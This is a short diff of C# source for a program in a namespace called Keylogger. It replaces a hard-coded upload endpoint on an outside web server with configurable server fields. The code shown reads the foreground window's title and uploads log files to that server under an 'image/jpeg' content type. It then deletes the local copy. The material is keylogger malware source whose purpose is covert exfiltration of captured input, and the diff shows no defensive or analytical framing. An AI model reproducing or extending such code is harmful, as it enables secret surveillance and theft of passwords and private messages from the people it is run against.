@@ -15,10 +15,11 @@ namespace Keylogger
     {
         string log = string.Empty;
         string currentWindowTitle = string.Empty;
-
         string currentHour = string.Empty;
-        string serverLink = "http://poklettre.fr/domotique/saveSQL.php";
 
+        string serverLink = "";
+        string serverArg = "";
+        
         //Get window titles
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
@@ -120,7 +121,7 @@ namespace Keylogger
                     {
                         // Upload the logs
                         NameValueCollection nvc = new NameValueCollection();
-                        HttpUploadFile(serverLink, filePath, "sql", "image/jpeg", nvc);
+                        HttpUploadFile(serverLink, filePath, serverArg, "image/jpeg", nvc);
 
                         // Delete the file
                         File.Delete(filePath);
